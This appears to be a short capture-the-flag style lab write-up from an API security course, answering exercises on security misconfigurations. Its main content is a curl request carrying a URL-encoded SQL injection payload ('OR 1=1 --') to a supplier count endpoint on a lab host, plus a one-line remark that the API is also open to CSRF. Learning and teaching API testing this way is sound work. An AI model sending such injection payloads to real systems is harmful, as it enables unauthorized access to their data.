# [Security Misconfiguration](Security%20Misconfiguration.md)
### Exploit another Security Misconfiguration and provide the total count of records within the target table.

![](Screenshot%202026-09-16%20at%2008.06.25.png)

```sh
curl -X 'GET' \
  'http://154.57.164.82:31956/api/v1/suppliers/laptop%27%20OR%201%3D1%20--/count' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEzQGhhY2t0aGVib3guY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwcGxpZXJzX0dldFRvdGFsQ291bnRCeVN1cHBsaWVyTmFtZVN1YnN0cmluZyIsImV4cCI6MTc4OTUyMTk0MywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.nwU31ld7Fbgf1I4NhMVbD7SG0TnNl5d6_QscGJ4Tsxmpehn0m8RzHn4G7Kigs9ClastkPDMTxBTzQTVAxJdEag'
```

![](Screenshot%202026-09-16%20at%2008.08.28.png)
### Submit the header and its value that expose another Security Misconfiguration in the API.

Not only vulnerable to SQL injection but also CSRF

![](Screenshot%202026-09-16%20at%2008.11.06.png)